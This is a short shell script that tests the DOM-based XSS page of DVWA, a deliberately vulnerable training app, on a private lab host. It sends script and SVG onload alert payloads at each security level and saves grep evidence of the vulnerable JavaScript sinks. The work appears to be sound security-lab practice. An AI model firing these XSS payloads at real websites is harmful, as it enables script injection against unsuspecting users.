CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
BASE='http://10.31.0.87:3000'
mkdir -p evidence/xss

xdom(){ L=$1; curl -s -b "$CK; security=$L" "$BASE/vulnerabilities/xss_d/?default=$2" | grep -oE '<option value=[^>]*>[^<]*</option>|<script[^>]*>' | head -6; echo " <<== dom $L default=[$2]"; }

xdom low '<script>alert(1)</script>'
xdom low 'English<svg onload=alert(1)>'
xdom medium "<script>alert(1)</script>"
xdom high '<script>alert(1)</script>'
xdom impossible '<script>alert(1)</script>'

# Parse the underlying JS to prove DOM source->sink propagation:
echo "== DOM JS source (dvwa/js or inline)"
curl -s -b "$CK; security=low" "$BASE/vulnerabilities/xss_d/" > /tmp/xssd.html
grep -n -E 'location|document\.write|innerHTML|eval|select.*options|default' /tmp/xssd.html | head -20 | tee evidence/xss/dom-js-source.txt
